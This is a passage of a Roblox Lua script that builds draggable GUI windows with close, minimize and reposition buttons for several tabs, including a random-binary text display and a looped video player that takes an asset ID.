	repos(uwu["donut tab top bar"], 0.5, 276, 260 + 26)
end)

-------------------------------------------------------------------------------------------------------------------------------

uwu["donut tab main frame 1"].Size = UDim2.new(0, 276, 0, 234)
uwu["donut tab main frame 1"].Position = UDim2.new(0, 0, 1, 0)

uwu["donut tab main frame 1"].BackgroundColor3 = uwu["default background color"]

uwu["donut tab main frame 1"].BorderColor3 = uwu["default border color"]
uwu["donut tab main frame 1"].BorderSizePixel = 1

uwu["donut tab main frame 1"].Parent = uwu["donut tab top bar"]
uwu["donut tab main frame 1"].ZIndex = 109

uwu["donut"].Size = UDim2.new(0, 268, 0, 225)
uwu["donut"].Position = UDim2.new(0, 4, 0, 5)

uwu["donut"].BackgroundColor3 = uwu["default background color"]

uwu["donut"].BorderColor3 = uwu["default border color"]
uwu["donut"].BorderSizePixel = 1

uwu["donut"].Parent = uwu["donut tab main frame 1"]
uwu["donut"].ZIndex = 110

uwu["donut"].Font = Enum.Font.RobotoMono
uwu["donut"].TextColor3 = Color3.new(1, 1, 1)
uwu["donut"].TextSize = 9
uwu["donut"].TextWrapped = true
uwu["donut"].TextXAlignment = Enum.TextXAlignment.Center
uwu["donut"].TextYAlignment = Enum.TextYAlignment.Center
uwu["donut"].Text = ""
uwu["donut"].Name = "stay"

if uwu["is mobile?"] then
	uwu["donut"].TextSize = 7
else
	uwu["donut"].TextSize = 9
end

-------------------------------------------------------------------------------------------------------------------------------

uwu["donut tab block main frame"].Size = UDim2.new(0, 276, 0, 233)
uwu["donut tab block main frame"].Position = UDim2.new(0, 0, 1, 1)

uwu["donut tab block main frame"].BackgroundColor3 = uwu["default background color"]

uwu["donut tab block main frame"].BorderColor3 = uwu["default border color"]
uwu["donut tab block main frame"].BorderSizePixel = 1
uwu["donut tab block main frame"].BackgroundTransparency = 1

uwu["donut tab block main frame"].Parent = uwu["donut tab top bar"]
uwu["donut tab block main frame"].ZIndex = 110
uwu["donut tab block main frame"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

uwu["donut tab block all"].Size = UDim2.new(0, 276, 0, 260)
uwu["donut tab block all"].Position = UDim2.new(0, 0, 0, 0)

uwu["donut tab block all"].BackgroundColor3 = uwu["default background color"]

uwu["donut tab block all"].BorderColor3 = uwu["default border color"]
uwu["donut tab block all"].BorderSizePixel = 1
uwu["donut tab block all"].BackgroundTransparency = 0

uwu["donut tab block all"].Parent = uwu["donut tab top bar"]
uwu["donut tab block all"].ZIndex = 111
uwu["donut tab block all"].Visible = true

-------------------------------------------------------------------------------------------------------------------------------

uwu["binary tab top bar"].Size = UDim2.new(0, 246, 0, 26)

uwu["binary tab top bar"].BackgroundColor3 = uwu["default background color"]

uwu["binary tab top bar"].BorderColor3 = uwu["default border color"]
uwu["binary tab top bar"].BorderSizePixel = 1

uwu["binary tab top bar"].TextColor3 = uwu["default border color"]
uwu["binary tab top bar"].Font = Enum.Font.RobotoMono
uwu["binary tab top bar"].TextSize = 15
uwu["binary tab top bar"].TextScaled = false
uwu["binary tab top bar"].Text = " binary.lua o.o"
uwu["binary tab top bar"].TextXAlignment = Enum.TextXAlignment.Left
uwu["binary tab top bar"].TextYAlignment = Enum.TextYAlignment.Center

uwu["binary top bar text padding"] = Instance.new("UIPadding")
uwu["binary top bar text padding"].PaddingLeft = UDim.new(0, 0)
uwu["binary top bar text padding"].PaddingRight = UDim.new(0, 0)
uwu["binary top bar text padding"].Parent = uwu["binary tab top bar"]

uwu["binary tab top bar"].Parent = uwu["screen gui"]
uwu["binary tab top bar"].ZIndex = 113
uwu["binary tab top bar"].Visible = false

function dragbinarytabtopbar()
	local frame = uwu["binary tab top bar"]
	local dragToggle 	
	local dragSpeed = 0.25
	local dragStart 	
	local startPos 

	local function updatebuttoninput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		uwu["tween service"]:Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end

	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)

	uwu["user input service"].InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updatebuttoninput(input)
			end
		end
	end)
end

dragbinarytabtopbar()

-------------------------------------------------------------------------------------------------------------------------------

uwu["binary tab top bar close button"].Size = UDim2.new(0, 18, 0, 18)
uwu["binary tab top bar close button"].Position = UDim2.new(0, 224, 0, 4.7)

uwu["binary tab top bar close button"].BackgroundColor3 = uwu["default background color"]

uwu["binary tab top bar close button"].BorderColor3 = uwu["default border color"]
uwu["binary tab top bar close button"].BorderSizePixel = 1

uwu["binary tab top bar close button"].TextColor3 = uwu["default border color"]
uwu["binary tab top bar close button"].Font = Enum.Font.RobotoMono
uwu["binary tab top bar close button"].TextSize = 16
uwu["binary tab top bar close button"].TextScaled = false
uwu["binary tab top bar close button"].Text = "X"
uwu["binary tab top bar close button"].TextXAlignment = Enum.TextXAlignment.Center
uwu["binary tab top bar close button"].TextYAlignment = Enum.TextYAlignment.Center

uwu["binary tab top bar close button"].Parent = uwu["binary tab top bar"]
uwu["binary tab top bar close button"].ZIndex = 114

uwu["binary tab top bar close button text padding"] = Instance.new("UIPadding")
uwu["binary tab top bar close button text padding"].PaddingTop = UDim.new(0, -1)
uwu["binary tab top bar close button text padding"].Parent = uwu["binary tab top bar close button"]

uwu["binary tab top bar close button"].MouseButton1Click:Connect(function()
	if not binarytabcanminimize then return end
	if binaryrunning then
		binaryrunning:Disconnect()
		binaryrunning = nil
	end
	binarytabopen = false
	binarytabminimized = false
	playclicksound()
	uwu["binary tab top bar"].Visible = false
	repos(uwu["binary tab top bar"], 0, 246, 230 + 26)
end)

-------------------------------------------------------------------------------------------------------------------------------

uwu["binary tab top bar minimize button"].Size = UDim2.new(0, 18, 0, 18)
uwu["binary tab top bar minimize button"].Position = UDim2.new(0, 200, 0, 4.7)

uwu["binary tab top bar minimize button"].BackgroundColor3 = uwu["default background color"]

uwu["binary tab top bar minimize button"].BorderColor3 = uwu["default border color"]
uwu["binary tab top bar minimize button"].BorderSizePixel = 1

uwu["binary tab top bar minimize button"].TextColor3 = uwu["default border color"]
uwu["binary tab top bar minimize button"].Font = Enum.Font.RobotoMono
uwu["binary tab top bar minimize button"].TextSize = 16
uwu["binary tab top bar minimize button"].TextScaled = false
uwu["binary tab top bar minimize button"].Visible = true
uwu["binary tab top bar minimize button"].Text = "-"
uwu["binary tab top bar minimize button"].TextXAlignment = Enum.TextXAlignment.Center
uwu["binary tab top bar minimize button"].TextYAlignment = Enum.TextYAlignment.Center

uwu["binary tab top bar minimize button"].Parent = uwu["binary tab top bar"]
uwu["binary tab top bar minimize button"].ZIndex = 114

uwu["binary tab top bar minimize button text padding"] = Instance.new("UIPadding")
uwu["binary tab top bar minimize button text padding"].PaddingTop = UDim.new(0, -2)
uwu["binary tab top bar minimize button text padding"].Parent = uwu["binary tab top bar minimize button"]

binarytabminimized = false
binarytabcanminimize = true

uwu["binary tab top bar minimize button"].MouseButton1Click:Connect(function()
	if not binarytabcanminimize then return end
	spawn(playclicksound)
	binarytabcanminimize = false

	binarytabminimized = not binarytabminimized

	if binarytabminimized then
		uwu["binary tab top bar minimize button"].Text = "+"
		uwu["binary tab block main frame"].Visible = true

		local fadeTween = fade(uwu["binary tab block main frame"], 0, 0.2)
		fadeTween.Completed:Wait()
		uwu["binary tab main frame 1"].Visible = false

		local tween = tweenSizePosition(
			uwu["binary tab block main frame"],
			UDim2.new(0, 246, 0, 0),
			UDim2.new(0, 0, 1, 1),
			0.5
		)
		tween.Completed:Wait()

		binarytabreallyminimized = true
		uwu["binary tab block main frame"].Visible = false
	else
		uwu["binary tab top bar minimize button"].Text = "-"
		uwu["binary tab block main frame"].Visible = true

		local tween = tweenSizePosition(
			uwu["binary tab block main frame"],
			UDim2.new(0, 246, 0, 203),
			UDim2.new(0, 0, 1, 1),
			0.5
		)
		tween.Completed:Wait()
		uwu["binary tab main frame 1"].Visible = true

		local fadeTween = fade(uwu["binary tab block main frame"], 1, 0.2)
		fadeTween.Completed:Wait()

		binarytabreallyminimized = false
		uwu["binary tab block main frame"].Visible = false
	end

	binarytabcanminimize = true
end)

-------------------------------------------------------------------------------------------------------------------------------

uwu["binary tab top bar reposition button"].Size = UDim2.new(0, 18, 0, 18)
uwu["binary tab top bar reposition button"].Position = UDim2.new(0, 176, 0, 4.7)

uwu["binary tab top bar reposition button"].BackgroundColor3 = uwu["default background color"]

uwu["binary tab top bar reposition button"].BorderColor3 = uwu["default border color"]
uwu["binary tab top bar reposition button"].BorderSizePixel = 1

uwu["binary tab top bar reposition button"].TextColor3 = uwu["default border color"]
uwu["binary tab top bar reposition button"].Font = Enum.Font.RobotoMono
uwu["binary tab top bar reposition button"].TextSize = 16
uwu["binary tab top bar reposition button"].TextScaled = false
uwu["binary tab top bar reposition button"].Text = "R"
uwu["binary tab top bar reposition button"].TextXAlignment = Enum.TextXAlignment.Center
uwu["binary tab top bar reposition button"].TextYAlignment = Enum.TextYAlignment.Center

uwu["binary tab top bar reposition button"].Parent = uwu["binary tab top bar"]
uwu["binary tab top bar reposition button"].ZIndex = 114

uwu["binary tab top bar reposition button text padding"] = Instance.new("UIPadding")
uwu["binary tab top bar reposition button text padding"].PaddingTop = UDim.new(0, -1)
uwu["binary tab top bar reposition button text padding"].Parent = uwu["binary tab top bar reposition button"]

uwu["binary tab top bar reposition button"].MouseButton1Click:Connect(function()
	playclicksound()
	repos(uwu["binary tab top bar"], 0.5, 246, 230 + 26)
end)

-------------------------------------------------------------------------------------------------------------------------------

uwu["binary tab main frame 1"].Size = UDim2.new(0, 246, 0, 204)
uwu["binary tab main frame 1"].Position = UDim2.new(0, 0, 1, 0)

uwu["binary tab main frame 1"].BackgroundColor3 = uwu["default background color"]

uwu["binary tab main frame 1"].BorderColor3 = uwu["default border color"]
uwu["binary tab main frame 1"].BorderSizePixel = 1

uwu["binary tab main frame 1"].Parent = uwu["binary tab top bar"]
uwu["binary tab main frame 1"].ZIndex = 112

uwu["binary"].Size = UDim2.new(0, 238, 0, 195)
uwu["binary"].Position = UDim2.new(0, 4, 0, 5)

uwu["binary"].BackgroundColor3 = uwu["default background color"]

uwu["binary"].BorderColor3 = uwu["default border color"]
uwu["binary"].BorderSizePixel = 1

uwu["binary"].Parent = uwu["binary tab main frame 1"]
uwu["binary"].ZIndex = 113

uwu["binary"].Font = Enum.Font.RobotoMono
uwu["binary"].TextColor3 = Color3.new(1, 1, 1)
uwu["binary"].TextSize = 15
uwu["binary"].TextWrapped = true
uwu["binary"].TextXAlignment = Enum.TextXAlignment.Center
uwu["binary"].TextYAlignment = Enum.TextYAlignment.Center
uwu["binary"].ClipsDescendants = true
uwu["binary"].Name = "stay"

uwu["binary text padding"] = Instance.new("UIPadding")
uwu["binary text padding"].PaddingBottom = UDim.new(0, 0)
uwu["binary text padding"].Parent = uwu["binary"]

function grcl()
	local lines = {}
	for i = 1, 30 do
		table.insert(lines, grs(50))
	end
	return table.concat(lines, "\n")
end

function grcl2()
	local lines = {}
	for i = 1, 30 do
		table.insert(lines, grs2(34))
	end
	return table.concat(lines, "\n")
end

function changebinary()
	uwu["binary"].Text = grcl2()
end

-------------------------------------------------------------------------------------------------------------------------------

uwu["binary tab block main frame"].Size = UDim2.new(0, 276, 0, 233)
uwu["binary tab block main frame"].Position = UDim2.new(0, 0, 1, 1)

uwu["binary tab block main frame"].BackgroundColor3 = uwu["default background color"]

uwu["binary tab block main frame"].BorderColor3 = uwu["default border color"]
uwu["binary tab block main frame"].BorderSizePixel = 1
uwu["binary tab block main frame"].BackgroundTransparency = 1

uwu["binary tab block main frame"].Parent = uwu["binary tab top bar"]
uwu["binary tab block main frame"].ZIndex = 113
uwu["binary tab block main frame"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

uwu["binary tab block all"].Size = UDim2.new(0, 276, 0, 260)
uwu["binary tab block all"].Position = UDim2.new(0, 0, 0, 0)

uwu["binary tab block all"].BackgroundColor3 = uwu["default background color"]

uwu["binary tab block all"].BorderColor3 = uwu["default border color"]
uwu["binary tab block all"].BorderSizePixel = 1
uwu["binary tab block all"].BackgroundTransparency = 0

uwu["binary tab block all"].Parent = uwu["binary tab top bar"]
uwu["binary tab block all"].ZIndex = 114
uwu["binary tab block all"].Visible = true

-------------------------------------------------------------------------------------------------------------------------------

uwu["video tab top bar"].Size = UDim2.new(0, 208, 0, 26)

uwu["video tab top bar"].BackgroundColor3 = uwu["default background color"]

uwu["video tab top bar"].BorderColor3 = uwu["default border color"]
uwu["video tab top bar"].BorderSizePixel = 1

uwu["video tab top bar"].TextColor3 = uwu["default border color"]
uwu["video tab top bar"].Font = Enum.Font.RobotoMono
uwu["video tab top bar"].TextSize = 15
uwu["video tab top bar"].TextScaled = false
uwu["video tab top bar"].Text = " video.lua o.o"
uwu["video tab top bar"].TextXAlignment = Enum.TextXAlignment.Left
uwu["video tab top bar"].TextYAlignment = Enum.TextYAlignment.Center

uwu["video top bar text padding"] = Instance.new("UIPadding")
uwu["video top bar text padding"].PaddingLeft = UDim.new(0, 0)
uwu["video top bar text padding"].PaddingRight = UDim.new(0, 0)
uwu["video top bar text padding"].Parent = uwu["video tab top bar"]

uwu["video tab top bar"].Parent = uwu["screen gui"]
uwu["video tab top bar"].ZIndex = 413
uwu["video tab top bar"].Visible = false

function dragvideotabtopbar()
	local frame = uwu["video tab top bar"]
	local dragToggle 	
	local dragSpeed = 0.25
	local dragStart 	
	local startPos 

	local function updatebuttoninput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		uwu["tween service"]:Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end

	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)

	uwu["user input service"].InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updatebuttoninput(input)
			end
		end
	end)
end

dragvideotabtopbar()

-------------------------------------------------------------------------------------------------------------------------------

uwu["video tab top bar close button"].Size = UDim2.new(0, 18, 0, 18)
uwu["video tab top bar close button"].Position = UDim2.new(0, 186, 0, 4.7)

uwu["video tab top bar close button"].BackgroundColor3 = uwu["default background color"]

uwu["video tab top bar close button"].BorderColor3 = uwu["default border color"]
uwu["video tab top bar close button"].BorderSizePixel = 1

uwu["video tab top bar close button"].TextColor3 = uwu["default border color"]
uwu["video tab top bar close button"].Font = Enum.Font.RobotoMono
uwu["video tab top bar close button"].TextSize = 16
uwu["video tab top bar close button"].TextScaled = false
uwu["video tab top bar close button"].Text = "X"
uwu["video tab top bar close button"].TextXAlignment = Enum.TextXAlignment.Center
uwu["video tab top bar close button"].TextYAlignment = Enum.TextYAlignment.Center

uwu["video tab top bar close button"].Parent = uwu["video tab top bar"]
uwu["video tab top bar close button"].ZIndex = 414

uwu["video tab top bar close button text padding"] = Instance.new("UIPadding")
uwu["video tab top bar close button text padding"].PaddingTop = UDim.new(0, -1)
uwu["video tab top bar close button text padding"].Parent = uwu["video tab top bar close button"]

uwu["video tab top bar close button"].MouseButton1Click:Connect(function()
	if not videotabcanminimize then return end
	videotabopen = false
	videotabminimized = false
	playclicksound()
	uwu["video tab top bar"].Visible = false
	repos(uwu["video tab top bar"], 0, 208, 315 + 26)
end)

-------------------------------------------------------------------------------------------------------------------------------

uwu["video tab top bar minimize button"].Size = UDim2.new(0, 18, 0, 18)
uwu["video tab top bar minimize button"].Position = UDim2.new(0, 162, 0, 4.7)

uwu["video tab top bar minimize button"].BackgroundColor3 = uwu["default background color"]

uwu["video tab top bar minimize button"].BorderColor3 = uwu["default border color"]
uwu["video tab top bar minimize button"].BorderSizePixel = 1

uwu["video tab top bar minimize button"].TextColor3 = uwu["default border color"]
uwu["video tab top bar minimize button"].Font = Enum.Font.RobotoMono
uwu["video tab top bar minimize button"].TextSize = 16
uwu["video tab top bar minimize button"].TextScaled = false
uwu["video tab top bar minimize button"].Visible = true
uwu["video tab top bar minimize button"].Text = "-"
uwu["video tab top bar minimize button"].TextXAlignment = Enum.TextXAlignment.Center
uwu["video tab top bar minimize button"].TextYAlignment = Enum.TextYAlignment.Center

uwu["video tab top bar minimize button"].Parent = uwu["video tab top bar"]
uwu["video tab top bar minimize button"].ZIndex = 414

uwu["video tab top bar minimize button text padding"] = Instance.new("UIPadding")
uwu["video tab top bar minimize button text padding"].PaddingTop = UDim.new(0, -2)
uwu["video tab top bar minimize button text padding"].Parent = uwu["video tab top bar minimize button"]

videotabminimized = false
videotabcanminimize = true

uwu["video tab top bar minimize button"].MouseButton1Click:Connect(function()
	if not videotabcanminimize then return end
	spawn(playclicksound)
	videotabcanminimize = false

	videotabminimized = not videotabminimized

	if videotabminimized then
		uwu["video tab top bar minimize button"].Text = "+"
		uwu["video tab block main frame"].Visible = true

		local fadeTween = fade(uwu["video tab block main frame"], 0, 0.2)
		fadeTween.Completed:Wait()
		uwu["video tab main frame 1"].Visible = false

		local tween = tweenSizePosition(
			uwu["video tab block main frame"],
			UDim2.new(0, 208, 0, 0),
			UDim2.new(0, 0, 1, 1),
			0.5
		)
		tween.Completed:Wait()

		videotabreallyminimized = true
		uwu["video tab block main frame"].Visible = false
	else
		uwu["video tab top bar minimize button"].Text = "-"
		uwu["video tab block main frame"].Visible = true

		local tween = tweenSizePosition(
			uwu["video tab block main frame"],
			UDim2.new(0, 208, 0, 288),
			UDim2.new(0, 0, 1, 1),
			0.5
		)
		tween.Completed:Wait()
		uwu["video tab main frame 1"].Visible = true

		local fadeTween = fade(uwu["video tab block main frame"], 1, 0.2)
		fadeTween.Completed:Wait()

		videotabreallyminimized = false
		uwu["video tab block main frame"].Visible = false
	end

	videotabcanminimize = true
end)

-------------------------------------------------------------------------------------------------------------------------------

uwu["video tab top bar reposition button"].Size = UDim2.new(0, 18, 0, 18)
uwu["video tab top bar reposition button"].Position = UDim2.new(0, 138, 0, 4.7)

uwu["video tab top bar reposition button"].BackgroundColor3 = uwu["default background color"]

uwu["video tab top bar reposition button"].BorderColor3 = uwu["default border color"]
uwu["video tab top bar reposition button"].BorderSizePixel = 1

uwu["video tab top bar reposition button"].TextColor3 = uwu["default border color"]
uwu["video tab top bar reposition button"].Font = Enum.Font.RobotoMono
uwu["video tab top bar reposition button"].TextSize = 16
uwu["video tab top bar reposition button"].TextScaled = false
uwu["video tab top bar reposition button"].Text = "R"
uwu["video tab top bar reposition button"].TextXAlignment = Enum.TextXAlignment.Center
uwu["video tab top bar reposition button"].TextYAlignment = Enum.TextYAlignment.Center

uwu["video tab top bar reposition button"].Parent = uwu["video tab top bar"]
uwu["video tab top bar reposition button"].ZIndex = 414

uwu["video tab top bar reposition button text padding"] = Instance.new("UIPadding")
uwu["video tab top bar reposition button text padding"].PaddingTop = UDim.new(0, -1)
uwu["video tab top bar reposition button text padding"].Parent = uwu["video tab top bar reposition button"]

uwu["video tab top bar reposition button"].MouseButton1Click:Connect(function()
	playclicksound()
	repos(uwu["video tab top bar"], 0.5, 208, 315 + 26)
end)

-------------------------------------------------------------------------------------------------------------------------------

uwu["video tab main frame 1"].Size = UDim2.new(0, 208, 0, 289)
uwu["video tab main frame 1"].Position = UDim2.new(0, 0, 1, 0)

uwu["video tab main frame 1"].BackgroundColor3 = uwu["default background color"]

uwu["video tab main frame 1"].BorderColor3 = uwu["default border color"]
uwu["video tab main frame 1"].BorderSizePixel = 1

uwu["video tab main frame 1"].Parent = uwu["video tab top bar"]
uwu["video tab main frame 1"].ZIndex = 412

-------------------------------------------------------------------------------------------------------------------------------

uwu["video id textbox"].Size = UDim2.new(0, 200, 0, 35)
uwu["video id textbox"].Position = UDim2.new(0, 4, 0, 210)
uwu["video id textbox"].BackgroundColor3 = uwu["default background color"]
uwu["video id textbox"].BorderColor3 = uwu["default border color"]
uwu["video id textbox"].BorderSizePixel = 1
uwu["video id textbox"].Parent = uwu["video tab main frame 1"]
uwu["video id textbox"].Font = Enum.Font.RobotoMono
uwu["video id textbox"].TextColor3 = Color3.new(1, 1, 1)
uwu["video id textbox"].Text = ""
uwu["video id textbox"].PlaceholderText = "enter videoframe ID"
uwu["video id textbox"].PlaceholderColor3 = uwu["default 1/2 color"]
uwu["video id textbox"].TextSize = 15
uwu["video id textbox"].TextWrapped = true
uwu["video id textbox"].TextXAlignment = Enum.TextXAlignment.Center
uwu["video id textbox"].TextYAlignment = Enum.TextYAlignment.Center
uwu["video id textbox"].ClipsDescendants = true
uwu["video id textbox"].ZIndex = 413

uwu["video id enter"].Size = UDim2.new(0, 200, 0, 35)
uwu["video id enter"].Position = UDim2.new(0, 4, 0, 250)
uwu["video id enter"].BackgroundColor3 = uwu["default background color"]
uwu["video id enter"].BorderColor3 = uwu["default border color"]
uwu["video id enter"].BorderSizePixel = 1
uwu["video id enter"].Parent = uwu["video tab main frame 1"]
uwu["video id enter"].Font = Enum.Font.RobotoMono
uwu["video id enter"].TextColor3 = Color3.new(1, 1, 1)
uwu["video id enter"].Text = "set video"
uwu["video id enter"].TextSize = 15
uwu["video id enter"].TextWrapped = true
uwu["video id enter"].TextXAlignment = Enum.TextXAlignment.Center
uwu["video id enter"].TextYAlignment = Enum.TextYAlignment.Center
uwu["video id enter"].ClipsDescendants = true
uwu["video id enter"].ZIndex = 413

uwu["video id enter"].MouseButton1Click:Connect(function()
	spawn(playclicksound)
	uwu["video"].Video = "rbxassetid://" .. uwu["video id textbox"].Text
	uwu["video"].Looped = true
	uwu["video"]:Play()
end)

uwu["video"].Size = UDim2.new(0, 200, 0, 200)
uwu["video"].Position = UDim2.new(0, 4, 0, 5)
uwu["video"].BackgroundColor3 = uwu["default background color"]
uwu["video"].BorderColor3 = uwu["default border color"]
uwu["video"].BorderSizePixel = 1
uwu["video"].Parent = uwu["video tab main frame 1"]
uwu["video"].ZIndex = 413

-------------------------------------------------------------------------------------------------------------------------------

uwu["video tab block main frame"].Size = UDim2.new(0, 208, 0, 288)
uwu["video tab block main frame"].Position = UDim2.new(0, 0, 1, 1)

uwu["video tab block main frame"].BackgroundColor3 = uwu["default background color"]

uwu["video tab block main frame"].BorderColor3 = uwu["default border color"]
uwu["video tab block main frame"].BorderSizePixel = 1
uwu["video tab block main frame"].BackgroundTransparency = 1

uwu["video tab block main frame"].Parent = uwu["video tab top bar"]
uwu["video tab block main frame"].ZIndex = 413
uwu["video tab block main frame"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

uwu["video tab block all"].Size = UDim2.new(0, 238, 0, 315)
uwu["video tab block all"].Position = UDim2.new(0, 0, 0, 0)

uwu["video tab block all"].BackgroundColor3 = uwu["default background color"]

uwu["video tab block all"].BorderColor3 = uwu["default border color"]
uwu["video tab block all"].BorderSizePixel = 1
uwu["video tab block all"].BackgroundTransparency = 0

uwu["video tab block all"].Parent = uwu["video tab top bar"]
uwu["video tab block all"].ZIndex = 414
uwu["video tab block all"].Visible = true

-------------------------------------------------------------------------------------------------------------------------------

uwu["gaydar tab top bar"].Size = UDim2.new(0, 376, 0, 26)
uwu["gaydar tab top bar"].BackgroundColor3 = uwu["default background color"]

uwu["gaydar tab top bar"].BorderColor3 = uwu["default border color"]
uwu["gaydar tab top bar"].BorderSizePixel = 1

uwu["gaydar tab top bar"].TextColor3 = uwu["default border color"]
uwu["gaydar tab top bar"].Font = Enum.Font.RobotoMono
uwu["gaydar tab top bar"].TextSize = 15
uwu["gaydar tab top bar"].TextScaled = false
uwu["gaydar tab top bar"].Text = " gaydar.lua o.o"
uwu["gaydar tab top bar"].TextXAlignment = Enum.TextXAlignment.Left
uwu["gaydar tab top bar"].TextYAlignment = Enum.TextYAlignment.Center

uwu["gaydar top bar text padding"] = Instance.new("UIPadding")
uwu["gaydar top bar text padding"].PaddingLeft = UDim.new(0, 0)
uwu["gaydar top bar text padding"].PaddingRight = UDim.new(0, 0)
uwu["gaydar top bar text padding"].Parent = uwu["gaydar tab top bar"]

uwu["gaydar tab top bar"].Parent = uwu["screen gui"]
uwu["gaydar tab top bar"].ZIndex = 313
uwu["gaydar tab top bar"].Visible = false

function draggaydartabtopbar()
	local frame = uwu["gaydar tab top bar"]
	local dragToggle 	
	local dragSpeed = 0.25
	local dragStart 	
	local startPos 

	local function updatebuttoninput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		uwu["tween service"]:Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end

	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)

	uwu["user input service"].InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updatebuttoninput(input)
			end
		end
	end)
end

draggaydartabtopbar()

-------------------------------------------------------------------------------------------------------------------------------

uwu["gaydar tab top bar close button"].Size = UDim2.new(0, 18, 0, 18)
uwu["gaydar tab top bar close button"].Position = UDim2.new(0, 354, 0, 4.7)

uwu["gaydar tab top bar close button"].BackgroundColor3 = uwu["default background color"]

uwu["gaydar tab top bar close button"].BorderColor3 = uwu["default border color"]
uwu["gaydar tab top bar close button"].BorderSizePixel = 1

uwu["gaydar tab top bar close button"].TextColor3 = uwu["default border color"]
uwu["gaydar tab top bar close button"].Font = Enum.Font.RobotoMono
uwu["gaydar tab top bar close button"].TextSize = 16
uwu["gaydar tab top bar close button"].TextScaled = false
uwu["gaydar tab top bar close button"].Text = "X"
uwu["gaydar tab top bar close button"].TextXAlignment = Enum.TextXAlignment.Center
uwu["gaydar tab top bar close button"].TextYAlignment = Enum.TextYAlignment.Center

uwu["gaydar tab top bar close button"].Parent = uwu["gaydar tab top bar"]
uwu["gaydar tab top bar close button"].ZIndex = 314

uwu["gaydar tab top bar close button text padding"] = Instance.new("UIPadding")
uwu["gaydar tab top bar close button text padding"].PaddingTop = UDim.new(0, -1)
uwu["gaydar tab top bar close button text padding"].Parent = uwu["gaydar tab top bar close button"]

uwu["gaydar tab top bar close button"].MouseButton1Click:Connect(function()
	if not gaydartabcanminimize then return end
	gaydartabopen = false
	gaydartabminimized = false
	playclicksound()
	uwu["gaydar tab top bar"].Visible = false
	repos(uwu["gaydar tab top bar"], 0, 376, 230 + 26)
end)

-------------------------------------------------------------------------------------------------------------------------------

uwu["gaydar tab top bar minimize button"].Size = UDim2.new(0, 18, 0, 18)
uwu["gaydar tab top bar minimize button"].Position = UDim2.new(0, 330, 0, 4.7)

uwu["gaydar tab top bar minimize button"].BackgroundColor3 = uwu["default background color"]

uwu["gaydar tab top bar minimize button"].BorderColor3 = uwu["default border color"]
uwu["gaydar tab top bar minimize button"].BorderSizePixel = 1

uwu["gaydar tab top bar minimize button"].TextColor3 = uwu["default border color"]
uwu["gaydar tab top bar minimize button"].Font = Enum.Font.RobotoMono
uwu["gaydar tab top bar minimize button"].TextSize = 16
uwu["gaydar tab top bar minimize button"].TextScaled = false
uwu["gaydar tab top bar minimize button"].Visible = true
uwu["gaydar tab top bar minimize button"].Text = "-"
uwu["gaydar tab top bar minimize button"].TextXAlignment = Enum.TextXAlignment.Center
uwu["gaydar tab top bar minimize button"].TextYAlignment = Enum.TextYAlignment.Center

uwu["gaydar tab top bar minimize button"].Parent = uwu["gaydar tab top bar"]
uwu["gaydar tab top bar minimize button"].ZIndex = 314

uwu["gaydar tab top bar minimize button text padding"] = Instance.new("UIPadding")
uwu["gaydar tab top bar minimize button text padding"].PaddingTop = UDim.new(0, -2)
uwu["gaydar tab top bar minimize button text padding"].Parent = uwu["gaydar tab top bar minimize button"]

gaydartabminimized = false
gaydartabcanminimize = true

uwu["gaydar tab top bar minimize button"].MouseButton1Click:Connect(function()
	if not gaydartabcanminimize then return end
	spawn(playclicksound)
	gaydartabcanminimize = false

	gaydartabminimized = not gaydartabminimized

	if gaydartabminimized then
		uwu["gaydar tab top bar minimize button"].Text = "+"
		uwu["gaydar tab block main frame"].Visible = true

		local fadeTween = fade(uwu["gaydar tab block main frame"], 0, 0.2)
		fadeTween.Completed:Wait()
		uwu["gaydar tab main frame 1"].Visible = false

		local tween = tweenSizePosition(
			uwu["gaydar tab block main frame"],
			UDim2.new(0, 376, 0, 0),
			UDim2.new(0, 0, 1, 1),
			0.5
		)
		tween.Completed:Wait()

		gaydartabreallyminimized = true
		uwu["gaydar tab block main frame"].Visible = false
	else
		uwu["gaydar tab top bar minimize button"].Text = "-"
		uwu["gaydar tab block main frame"].Visible = true

		local tween = tweenSizePosition(
			uwu["gaydar tab block main frame"],
			UDim2.new(0, 376, 0, 203),
			UDim2.new(0, 0, 1, 1),
			0.5
		)
		tween.Completed:Wait()
		uwu["gaydar tab main frame 1"].Visible = true

		local fadeTween = fade(uwu["gaydar tab block main frame"], 1, 0.2)
